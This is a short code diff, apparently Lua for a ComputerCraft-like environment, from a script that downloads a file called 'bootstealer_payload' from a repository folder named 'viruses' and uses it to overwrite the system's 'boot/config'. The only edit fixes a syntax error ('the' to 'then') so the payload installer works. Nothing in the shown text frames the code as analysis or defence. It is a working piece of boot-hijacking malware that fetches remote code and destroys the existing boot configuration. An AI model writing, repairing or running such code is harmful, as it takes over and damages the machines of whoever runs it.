@@ -2,7 +2,7 @@
 
 shell.run("wget https://raw.githubusercontent.com/Raven0S/RavenOS/master/viruses/bootstealer_payload payload")
 
-if fs.exists("boot/config") the
+if fs.exists("boot/config") then
   fs.delete("boot/config")
   fs.copy("payload", "boot/config")
 else
